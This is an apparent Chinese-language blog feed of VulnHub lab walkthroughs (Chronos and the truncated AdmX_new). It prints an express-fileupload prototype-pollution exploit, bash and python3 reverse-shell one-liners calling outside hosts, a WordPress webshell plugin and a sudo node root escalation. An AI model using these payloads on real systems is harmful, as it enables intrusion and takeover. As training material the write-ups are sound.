-l</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104094950343.png" alt="image-20211104094950343"></p><p>很可惜，查看失败，发现只有imera用户自己可以对user.txt进行读写，<strong>只有提权才能执行查看</strong></p><hr><h2 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h2><h3 id="1-初次尝试提权"><a href="#1-初次尝试提权" class="headerlink" title="1.初次尝试提权"></a>1.初次尝试提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id  #当前用户权限</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104095325207.png" alt="image-20211104095325207"></p><p>是一个名为www-data的用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a   #利用是否存在内核漏洞</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104095419553.png" alt="image-20211104095419553"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l#利用是否存在sudo命令漏洞</span><br></pre></td></tr></table></figure><p>没有反馈.</p><p>利用常见的提权方法，都没能找到突破口。</p><p>至此，陷入了困境…-_-</p><hr><h3 id="2-代码审计"><a href="#2-代码审计" class="headerlink" title="2.代码审计"></a>2.代码审计</h3><p>尝试在其他目录看能否发现突破口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/chronos</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104095949572.png" alt="image-20211104095949572"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat package.json</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104100153967.png" alt="image-20211104100153967"></p><blockquote><p>{<br> “dependencies”: {<br>   “bs58”: “^4.0.1”,<br>   “cors”: “^2.8.5”,<br>   “express”: “^4.17.1”<br> }<br>}</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat app.js</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104100502437.png" alt="image-20211104100502437"></p><blockquote><p>&#x2F;&#x2F; created by alienum for Penetration Testing<br>const express &#x3D; require(‘express’);<br>const { exec } &#x3D; require(“child_process”);<br>const bs58 &#x3D; require(‘bs58’);<br>const app &#x3D; express();</p><p>const port &#x3D; 8000;</p><p>const cors &#x3D; require(‘cors’);</p><p>app.use(cors());</p><p>app.get(‘&#x2F;‘, (req,res) &#x3D;&gt;{</p><p>res.sendFile(“&#x2F;var&#x2F;www&#x2F;html&#x2F;index.html”);<br>});</p><p>app.get(‘&#x2F;date’, (req, res) &#x3D;&gt; {</p><p>var agent &#x3D; req.headers[‘user-agent’];<br>var cmd &#x3D; ‘date ‘;<br>const format &#x3D; req.query.format;<br>const bytes &#x3D; bs58.decode(format);<br>var decoded &#x3D; bytes.toString();<br>var concat &#x3D; cmd.concat(decoded);<br>if (agent &#x3D;&#x3D;&#x3D; ‘Chronos’) {<br>  if (concat.includes(‘id’) || concat.includes(‘whoami’) || concat.includes(‘python’) || concat.includes(‘nc’) || concat.includes(‘bash’) || concat.includes(‘php’) || concat.includes(‘which’) || concat.includes(‘socat’)) {</p><p>  res.send(“Something went wrong”);</p><p>  }<br>  exec(concat, (error, stdout, stderr) &#x3D;&gt; {<br>      if (error) {<br>          console.log(<code>error: $&#123;error.message&#125;</code>);<br>          return;<br>      }<br>      if (stderr) {<br>          console.log(<code>stderr: $&#123;stderr&#125;</code>);<br>          return;<br>      }<br>      res.send(stdout);<br>  });<br>}<br>else{</p><p>  res.send(“Permission Denied”);<br>}<br>})</p><p>app.listen(port,() &#x3D;&gt; {</p><p>console.log(<code>Server running at $&#123;port&#125;</code>);</p><p>})</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ..                   #来到上级目录</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104100626091.png" alt="image-20211104100626091"></p><p>发现chronos-v2文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd chronos-v2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104100808654.png" alt="image-20211104100808654"></p><p>发现是另一个web应用，index.html（主页面），frontend（前端），backend（后端）</p><p>进入backend目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd backend</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104100901040.png" alt="image-20211104100901040"></p><p>同样看到了package.json文件，进行查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat package.json</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104101138166.png" alt="image-20211104101138166"></p><blockquote><p>{<br> “name”: “some-website”,<br> “version”: “1.0.0”,<br> “description”: “”,<br> “main”: “server.js”,<br> “scripts”: {<br>   “start”: “node server.js”<br> },<br> “author”: “”,<br> “license”: “ISC”,<br> “dependencies”: {<br>   “ejs”: “^3.1.5”,<br>   “express”: “^4.17.1”,<br>   <strong>“express-fileupload”: “^1.1.7-alpha.3”</strong>   #文件上传？？？？？？<br> }<br>}</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat server.js</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104101352160.png" alt="image-20211104101352160"></p><blockquote><p>const express &#x3D; require(‘express’);<br>const fileupload &#x3D; require(“express-fileupload”);<br>const http &#x3D; require(‘http’)</p><p>const app &#x3D; express();</p><p>app.use(fileupload({ parseNested: true }));</p><p>app.set(‘view engine’, ‘ejs’);<br>app.set(‘views’, “&#x2F;opt&#x2F;chronos-v2&#x2F;frontend&#x2F;pages”);</p><p>app.get(‘&#x2F;‘, (req, res) &#x3D;&gt; {<br>  res.render(‘index’)<br>});</p><p>const server &#x3D; http.Server(app);<br><strong>const addr &#x3D; “127.0.0.1”</strong>         #reason：为什么扫描的时候没有扫描到8080端口 answer：因为Web应用只有在本机才能访问<br><strong>const port &#x3D; 8080;</strong><br>server.listen(port, addr, () &#x3D;&gt; {<br>  console.log(‘Server listening on ‘ + addr + ‘ port ‘ + port);<br>});</p></blockquote><h3 id="3-搜索大法好"><a href="#3-搜索大法好" class="headerlink" title="3.搜索大法好"></a>3.搜索大法好</h3><p>express-fileupload漏洞</p><p>百度：<a href="https://www.sohu.com/a/412389503_100002744">流行的Node.js库中存在原型污染漏洞，可致Web应用程序遭受DoS和远程Shell攻击_Posix (sohu.com)</a></p><p>Google：<a href="https://blog.p6.is/Real-World-JS-1/">https://blog.p6.is/Real-World-JS-1/</a></p><p><strong>发现EXP</strong></p><blockquote><p>import requests</p><p>cmd &#x3D; ‘bash -c “bash -i &amp;&gt; &#x2F;dev&#x2F;tcp&#x2F;p6.is&#x2F;8888 0&gt;&amp;1”‘</p><p>#pollute</p><p>requests.post(‘<a href="http://p6.is:7777&#39;">http://p6.is:7777&#39;</a>, files &#x3D; {‘<strong>proto</strong>.outputFunctionName’: (<br>   None, f”x;console.log(1);process.mainModule.require(‘child_process’).exec(‘{cmd}’);x”)})</p><p>#execute command</p><p>requests.get(‘<a href="http://p6.is:7777&#39;">http://p6.is:7777&#39;</a>)</p></blockquote><p>kali:</p><p>根据ip修改EXP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi exp.py</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104101833596.png" alt="image-20211104101833596"></p><blockquote><p>import requests</p><p>cmd &#x3D; ‘bash -c “bash -i &amp;&gt; &#x2F;dev&#x2F;tcp&#x2F;10.0.2.4&#x2F;4444 0&gt;&amp;1”‘</p><p>#pollute</p><p>requests.post(‘<a href="http://127.0.0.1:8080&#39;">http://127.0.0.1:8080&#39;</a>, files &#x3D; {‘<strong>proto</strong>.outputFunctionName’: (<br>   None, f”x;console.log(1);process.mainModule.require(‘child_process’).exec(‘{cmd}’);x”)})</p><p>#execute command</p><p>requests.get(‘<a href="http://127.0.0.1:8080&#39;">http://127.0.0.1:8080&#39;</a>)</p></blockquote><p>已将exp写在本地，需将该exp.py上传至目标端</p><p>kali：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104102630662.png" alt="image-20211104102630662"></p><p>shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp   #易向里写文件</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.0.2.4/exp.py</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104102839677.png" alt="image-20211104102839677"></p><p>exp.py上传成功</p><p>kali:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104103155596.png" alt="image-20211104103155596"></p><p>shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104103241230.png" alt="image-20211104103241230"></p><p><strong>成功建立反弹shell</strong>，当前用户为imera</p><p>结合之前的信息收集，得知imera用户主目录下有<strong>user.txt</strong>文件，进行查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104103811115.png" alt="image-20211104103811115"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat user.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104103921395.png" alt="image-20211104103921395"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK</span><br></pre></td></tr></table></figure><h3 id="4-最终提权"><a href="#4-最终提权" class="headerlink" title="4.最终提权"></a>4.最终提权</h3><p>尝试进入root目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104104228705.png" alt="image-20211104104228705"></p><p>失败，在此需要提权</p><p>尝试有没有sudo提权漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104104353472.png" alt="image-20211104104353472"></p><p>发现用户imera在没有root用户密码的权限下，只执行sudo，<strong>可以执行node和npm命令</strong></p><p>搜集发现了一段代码（调用node执行生成一个子进程，子进程运行&#x2F;bin&#x2F;bash）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo node -e &#x27;child_process.spawn(&quot;/bin/bash&quot;,&#123;stdio:[0,1,2]&#125;)&#x27;   </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104104738393.png" alt="image-20211104104738393"></p><p>发现已经<strong>成功提权</strong>为root用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd root</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat root.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week3//image-20211104104834470.png" alt="image-20211104104834470"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK</span><br></pre></td></tr></table></figure><hr><h2 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h2><p>CyberChef:</p><blockquote><p>user.txt</p><p>byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK</p><p>–&gt;o chronos pernaei file mou.</p><p>译–&gt;我们签署了谅解备忘录。</p></blockquote><blockquote><p>root.txt</p><p>YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK</p><p>–&gt;apopse siopi mazeuoume oneira.</p><p>译–&gt;我很高兴见到你。</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Name&lt;/strong&gt;: Chronos: 1&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Date release&lt;/strong&gt;: 9 Aug 2021&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Author&lt;/strong&gt;: &lt;a href=&quot;https://www.vulnhub.com/author/al1enum,745/&quot;&gt;AL1ENUM&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Series&lt;/strong&gt;: &lt;a href=&quot;https://www.vulnhub.com/series/chronos,495/&quot;&gt;Chronos&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Download&lt;/strong&gt;:&lt;a href=&quot;https://download.vulnhub.com/chronos/Chronos.ova&quot;&gt;https://download.vulnhub.com/chronos/Chronos.ova&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Difficulty&lt;/strong&gt; : medium&lt;/p&gt;
&lt;p&gt;This works better with VirtualBox rather than VMware.&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>VulnHub-4-AdmX_new</title>
    <link href="http://example.com/2022/04/12/week4/"/>
    <id>http://example.com/2022/04/12/week4/</id>
    <published>2022-04-12T07:08:50.899Z</published>
    <updated>2022-04-12T07:10:44.431Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>靶机地址: <a href="https://download.vulnhub.com/admx/AdmX_new.7z">https://download.vulnhub.com/admx/AdmX_new.7z</a><br>难度等级: 中<br>打靶目标: 取得 2 个 flag + root 权限</p></blockquote><span id="more"></span><h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn 10.0.2.0/24</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117091346386.png" alt="image-20211117091346386"></p><h3 id="2-端口扫描"><a href="#2-端口扫描" class="headerlink" title="2.端口扫描"></a>2.端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.11</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117091944645.png" alt="image-20211117091944645"></p><h3 id="3-端口服务信息扫描"><a href="#3-端口服务信息扫描" class="headerlink" title="3.端口服务信息扫描"></a>3.端口服务信息扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sV -p80 10.0.2.11</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117092313209.png" alt="image-20211117092313209"></p><h3 id="4-访问10-0-2-11的80端口页面"><a href="#4-访问10-0-2-11的80端口页面" class="headerlink" title="4.访问10.0.2.11的80端口页面"></a>4.访问10.0.2.11的80端口页面</h3><p>访问：10.0.2.11:80</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117092452624.png" alt="image-20211117092452624"></p><p>是Apache在Ubuntu下的默认页面，没有能够利用的信息</p><h3 id="5-使用feroxbuster目录扫描"><a href="#5-使用feroxbuster目录扫描" class="headerlink" title="5.使用feroxbuster目录扫描"></a>5.使用feroxbuster目录扫描</h3><p>（字典：sudo apt install seclist   较大）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">feroxbuster --url http://10.0.2.11 -w /usr/share/dirb/wordlists/common.txt</span><br></pre></td></tr></table></figure><p>扫描部分结果如下：</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117093525296.png" alt="image-20211117093525296"></p><h3 id="6-访问可疑目录"><a href="#6-访问可疑目录" class="headerlink" title="6.访问可疑目录"></a>6.访问可疑目录</h3><p>访问<a href="http://10.0.2.11/wordpress/">http://10.0.2.11/wordpress/</a></p><p>载入页面的过程长达5分钟，只能显示页面的部分信息，且一直处于加载中状态</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117100907047.png" alt="image-20211117100907047"></p><p>思考：一个WordPress的站点，究竟在访问过程中加载了什么？使得加载过程如此缓慢？</p><h3 id="7-使用Burpsuite对访问页面的流量进行分析"><a href="#7-使用Burpsuite对访问页面的流量进行分析" class="headerlink" title="7.使用Burpsuite对访问页面的流量进行分析"></a>7.使用Burpsuite对访问页面的流量进行分析</h3><p>配置代理–OFF–访问<a href="http://10.0.2.11/wordpress/">http://10.0.2.11/wordpress/</a> –HTTP history</p><p>发现在访问<a href="http://10.0.2.11/wordpress/%E7%9A%84%E8%BF%87%E7%A8%8B%E4%B8%AD%EF%BC%8C%E9%A1%B5%E9%9D%A2%E5%9C%A8%E8%B5%84%E6%BA%90%E8%AF%B7%E6%B1%82%E6%97%B6%E8%BF%98%E4%BC%9A%E8%AE%BF%E9%97%AE%E5%9C%B0%E5%9D%80192.168.159.145">http://10.0.2.11/wordpress/的过程中，页面在资源请求时还会访问地址192.168.159.145</a></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117103351121.png" alt="image-20211117103351121"></p><p>对页面返回的响应结果进行筛选过滤192.168.159.145</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117104819274.png" alt="image-20211117104819274"></p><p>发现存在默认访问该IP的硬编码写入</p><p>使用Burpsuite–Proxy–Match and Replace–Add–配置</p><p>作用：将响应头部中和响应体内的192.168.159.145强制替换为10.0.2.11</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117113559581.png" alt="image-20211117113559581"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117113614462.png" alt="image-20211117113614462"></p><p>重新访问页面</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117105003629.png" alt="image-20211117105003629"></p><p>发现访问顺畅迅速，且加载了之前没能加载到的前端JS脚本，即页面加载成功。</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117110643947.png" alt="image-20211117110643947"></p><h2 id="二、漏洞挖掘"><a href="#二、漏洞挖掘" class="headerlink" title="二、漏洞挖掘"></a>二、漏洞挖掘</h2><h3 id="1-对页面里的链接和表单提交等位置尝试检测"><a href="#1-对页面里的链接和表单提交等位置尝试检测" class="headerlink" title="1.对页面里的链接和表单提交等位置尝试检测"></a>1.对页面里的链接和表单提交等位置尝试检测</h3><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117105845151.png" alt="image-20211117105845151"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117110717572.png" alt="image-20211117110717572"></p><p>并未发现直接漏洞</p><h3 id="2-对WordPress版本的漏洞进行查找"><a href="#2-对WordPress版本的漏洞进行查找" class="headerlink" title="2.对WordPress版本的漏洞进行查找"></a>2.对WordPress版本的漏洞进行查找</h3><p>并未发现直接可利用漏洞（代码执行等）</p><h3 id="3-返回查看目录扫描结果"><a href="#3-返回查看目录扫描结果" class="headerlink" title="3.返回查看目录扫描结果"></a>3.返回查看目录扫描结果</h3><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117105722251.png" alt="image-20211117105722251"></p><p>发现疑似管理后台路径，尝试访问<a href="http://10.0.2.11/wordpress/wp-admin">http://10.0.2.11/wordpress/wp-admin</a></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117113657009.png" alt="image-20211117113657009"></p><p>确实是WordPress的管理后台，查询获得WordPress默认账号为admin，尝试弱口令后无果</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117113731381.png" alt="image-20211117113731381"></p><h3 id="4-对管理页面进行密码爆破"><a href="#4-对管理页面进行密码爆破" class="headerlink" title="4.对管理页面进行密码爆破"></a>4.对管理页面进行密码爆破</h3><p>根据长度筛选出 请求密码为adam14时发生了重定向</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117141137210.png" alt="image-20211117141137210"></p><p>分析响应头中，重定向到<a href="http://192.168.159.145/wordpress/wp-admin/">http://192.168.159.145/wordpress/wp-admin/</a></p><p>且有服务端分配给访问者的cookie</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117141215930.png" alt="image-20211117141215930"></p><p>登录WordPress后台，WordPress版本为5.7.1</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117141334010.png" alt="image-20211117141334010"></p><h3 id="5-WordPress后台漏洞利用"><a href="#5-WordPress后台漏洞利用" class="headerlink" title="5.WordPress后台漏洞利用"></a>5.WordPress后台漏洞利用</h3><h4 id="5-1尝试在“主题”插入一句话木马连接蚁剑"><a href="#5-1尝试在“主题”插入一句话木马连接蚁剑" class="headerlink" title="5.1尝试在“主题”插入一句话木马连接蚁剑"></a>5.1尝试在“主题”插入一句话木马连接蚁剑</h4><p>Appearance–Theme Editor–404.php</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117141839492.png" alt="image-20211117141839492"></p><p>上传失败</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117141931382.png" alt="image-20211117141931382"></p><h4 id="5-2利用插件上传webshell"><a href="#5-2利用插件上传webshell" class="headerlink" title="5.2利用插件上传webshell"></a>5.2利用插件上传webshell</h4><h5 id="5-2-1上传实现反弹shell连接"><a href="#5-2-1上传实现反弹shell连接" class="headerlink" title="5.2.1上传实现反弹shell连接"></a>5.2.1上传实现反弹shell连接</h5><p>本地写一个简单的插件（符合WordPress标准的）</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117142333540.png" alt="image-20211117142333540"></p><p>Plugins–Add–Upload Plugins</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117142059793.png" alt="image-20211117142059793"></p><p>并压缩为可上传格式</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117142554942.png" alt="image-20211117142554942"></p><p>上传、激活</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117142630478.png" alt="image-20211117142630478"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117142653949.png" alt="image-20211117142653949"></p><p>插件默认路径为：</p><p><a href="http://10.0.2.11/wordpress/wp-content/plugins/shell.php">http://10.0.2.11/wordpress/wp-content/plugins/shell.php</a></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117142901551.png" alt="image-20211117142901551"></p><p>尝试执行id命令：</p><p><a href="http://10.0.2.11/wordpress/wp-content/plugins/shell.php?cmd=id">http://10.0.2.11/wordpress/wp-content/plugins/shell.php?cmd=id</a></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117143020914.png" alt="image-20211117143020914"></p><p>确定了webshell上传成功，且可执行操作系统命令</p><h5 id="5-2-2-确认目标靶机上可利用的信息-x2F-软件"><a href="#5-2-2-确认目标靶机上可利用的信息-x2F-软件" class="headerlink" title="5.2.2 确认目标靶机上可利用的信息&#x2F;软件"></a>5.2.2 确认目标靶机上可利用的信息&#x2F;软件</h5><h6 id="Kali监听4444端口"><a href="#Kali监听4444端口" class="headerlink" title="Kali监听4444端口"></a>Kali监听4444端口</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117143051516.png" alt="image-20211117143051516"></p><h6 id="确定目标靶机是否有nc"><a href="#确定目标靶机是否有nc" class="headerlink" title="确定目标靶机是否有nc"></a>确定目标靶机是否有nc</h6><p>（存在，但本次尝试其他方法）</p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117143209631.png" alt="image-20211117143209631"></p><h6 id="确定目标靶机是否有Python环境"><a href="#确定目标靶机是否有Python环境" class="headerlink" title="确定目标靶机是否有Python环境"></a>确定目标靶机是否有Python环境</h6><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117144310167.png" alt="image-20211117144310167"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117144328196.png" alt="image-20211117144328196"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117144402379.png" alt="image-20211117144402379"></p><p>目标靶机存在Python3环境</p><h5 id="5-2-3使用python3反弹shell代码"><a href="#5-2-3使用python3反弹shell代码" class="headerlink" title="5.2.3使用python3反弹shell代码"></a>5.2.3使用python3反弹shell代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117145344122.png" alt="image-20211117145344122"></p><p><img src="https://gitee.com/byesec/picture/raw/master//target/Week4//image-20211117145402436.png" alt="image-20211117145402436"></p><p>使用msf 